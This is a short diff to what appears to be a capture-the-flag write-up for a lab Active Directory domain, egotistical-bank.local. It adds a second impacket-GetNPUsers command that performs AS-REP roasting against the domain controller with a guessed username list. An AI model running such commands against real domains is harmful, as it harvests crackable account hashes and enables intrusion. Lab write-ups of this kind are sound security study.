@@ -104,6 +104,8 @@ nothing
 
 ```bash
 impacket-GetNPUsers egotistical-bank.local/ -dc-ip $IP -no-pass -usersfile flast
+
+impacket-GetNPUsers egotistical-bank.local/ -dc-ip $IP -no-pass -usersfile gpt.name
 ```
 
 
